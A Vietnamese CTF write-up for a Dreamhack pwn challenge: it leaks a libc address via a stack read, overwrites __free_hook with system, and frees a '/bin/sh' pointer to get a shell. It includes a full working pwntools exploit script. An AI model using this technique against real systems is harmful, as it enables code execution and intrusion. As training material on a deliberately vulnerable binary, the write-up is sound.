# Challenge: __free_hook Overwrite

## Vấn đề
- [File challenge](https://github.com/haiwh07/CTFWriteUp/blob/main/dreamhack/free_hook_overwrite/fho)
- Chương trình thực thi như sau:
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  void *ptr; // [rsp+0h] [rbp-50h] BYREF
  __int64 v5; // [rsp+8h] [rbp-48h] BYREF
  char buf[56]; // [rsp+10h] [rbp-40h] BYREF
  unsigned __int64 v7; // [rsp+48h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("[1] Stack buffer overflow");
  printf("Buf: ");
  read(0, buf, 256uLL);
  printf("Buf: %s\n", buf);
  puts("[2] Arbitary-Address-Write");
  printf("To write: ");
  __isoc99_scanf("%llu", &ptr);
  printf("With: ");
  __isoc99_scanf("%llu", &v5);
  printf("[%p] = %llu\n", ptr, v5);
  *(_QWORD *)ptr = v5;
  puts("[3] Arbitrary-Address-Free");
  printf("To free: ");
  __isoc99_scanf("%llu", &ptr);
  free(ptr);
  return 0;
}
```
- Checksec:
```
+ Arch:       amd64-64-little
+ RELRO:      Full RELRO
+ Stack:      Canary found
+ NX:         NX enabled
+ PIE:        PIE enabled
+ Stripped:   No
```

## Giải pháp
- Khi dịch ngược chương trình, tôi thấy rằng ở phần [1] của chương trình có thể leak được dữ liệu. Tiếp theo phần [2] có thể overwrite một địa chỉ nào đấy bằng một giá trị gì đấy. Và cuối cùng phần [3] có thể free dữ liệu ở địa chỉ được chỉ định.
- Sau khi thấy có lệnh _free()_ tôi đã check qua libc xem có __free_hook để có thể khai thác hay không thì thấy có thể dùng nó để khai thác.
```
└─$ objdump -d -M intel libc-2.27.so | grep -A10 "97a51"
   97a51:       48 8b 05 98 34 35 00    mov    rax,QWORD PTR [rip+0x353498]        # 3eaef0 <__free_hook@@GLIBC_2.2.5-0x29f8>
   97a58:       48 8b 00                mov    rax,QWORD PTR [rax]
   97a5b:       48 85 c0                test   rax,rax
   97a5e:       0f 85 ac 02 00 00       jne    97d10 <__libc_free@@GLIBC_2.2.5+0x2e0>
└─$ objdump -d -M intel libc-2.27.so | grep -A10 "97d10"
   97d10:       48 8b 74 24 68          mov    rsi,QWORD PTR [rsp+0x68]
   97d15:       ff d0                   call   rax
   97d17:       e9 74 fe ff ff          jmp    97b90 <__libc_free@@GLIBC_2.2.5+0x160>
   97d1c:       0f 1f 40 00             nop    DWORD PTR [rax+0x0]
   97d20:       41 f6 44 24 f8 02       test   BYTE PTR [r12-0x8],0x2
   97d26:       0f 85 74 02 00 00       jne    97fa0 <__libc_free@@GLIBC_2.2.5+0x570>
   97d2c:       48 8d 05 a5 8c 35 00    lea    rax,[rip+0x358ca5]        # 3f09d8 <argp_program_version_hook@@GLIBC_2.2.5+0x1d8>
   97d33:       bd 01 00 00 00          mov    ebp,0x1
   97d38:       8b 00                   mov    eax,DWORD PTR [rax]
   97d3a:       85 c0                   test   eax,eax
   97d3c:       0f 85 da 04 00 00       jne    9821c <__libc_free@@GLIBC_2.2.5+0x7ec>
```
- Bởi vì khi __free_hook có chứa giá trị thì rax = [__free_hook]. Cùng với đó check qua libc có chứa hàm system hay "/bin/sh" không.
```
pwndbg> p&system
$1 = (<text variable, no debug info> *) 0x73136284f550 <system>
pwndbg> p&__free_hook
$2 = (<data variable, no debug info> *) 0x731362bed8e8 <__free_hook>
pwndbg> search "/bin/sh"
Searching for byte: b'/bin/sh'
libc-2.27.so    0x7313629b3e1a 0x68732f6e69622f /* '/bin/sh' */
⚠️ warning: Unable to access 16000 bytes of target memory at 0x7313629eed06, halting search
```
> Overwrite __free_hook bằng hàm system và free("/bin/sh") để lấy shell.

## Quá trình
- Bởi vì canary bài này mở bình thường ở buf chúng ta sẽ leak canary đầu tiên để có thể overwrite giá trị mà không để chương trình lỗi. Nhưng với trường hợp này chương trình chỉ cho một lần nhập input vào buf và chúng ta không thể overwrite lại được buf, do đó chúng ta không nên leak canary lúc này.
> Nếu không thể overwrite bằng canary thì chúng ta tìm cách xem lấy shell trước khi chương trình kết thúc.
- Thay vì leak canary bây giờ, tôi sẽ leak libc ngay sau _saved rbp_ từ buf tới ret address (offset = 56 + 8 bytes canary + 8 bytes rbp) lúc này ret address đang call (__libc_start_main+231). Mà dữ liệu libc vừa leak để tới libc base ta phải trừ đi 0x21b0a.
> Leak libc và tính offset để có được libc base.
- Sau khi leak được libc base, lúc này khi chương trình chạy phần [2] chúng ta sẽ có thể gắn [__free_hook] = system bằng cách tính offset từ libc base tới __free_hook và libc base tới system.
```
free_hook = libc.address + 0x3ed8e8
system_addr = libc.address + 0x4f550
```
- Cuối cùng để lấy được shell ta chỉ cần free(binsh_addr) như bên trên đã tìm thì địa chứa "/bin/sh" là 0x7313629b3e1a.
```
binsh_addr = libc.address + 0x1b3e1a
```
> Đẩy free(x) vào thì chương trình sẽ thực thi [__free_hook](x) tức là system("/bin/sh") và ta sẽ có được shell.

## Script
```
#!/usr/bin/env python3

from pwn import *

exe = ELF('fho_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+206
        c
        ''')
        input()


if args.REMOTE:
    p = remote('host3.dreamhack.games', 21102)
else:
    p = process([exe.path])
GDB()

############################
### STAGE 1: Leak Canary ###
############################
sla(b'Buf: ', b'A'*8*9)
p.recvuntil(b'A'*8*9)
libc_leak = u64(p.recv(6).ljust(8, b'\0'))
libc.address = libc_leak - 0x21b0a
info("Libc leak: " + hex(libc_leak))
info("Libc base: " + hex(libc.address))

###################################################
### STAGE 2: Overwrite __free_hook thanh system ###
###################################################
free_hook = libc.address + 0x3ed8e8
system_addr = libc.address + 0x4f550
slna(b'To write: ', free_hook)
slna(b'With: ', system_addr)

#####################################
### STAGE 3: Free /bin/sh address ###
#####################################
binsh_addr = libc.address + 0x1b3e1a
slna(b'To free: ', binsh_addr)

p.interactive()
```
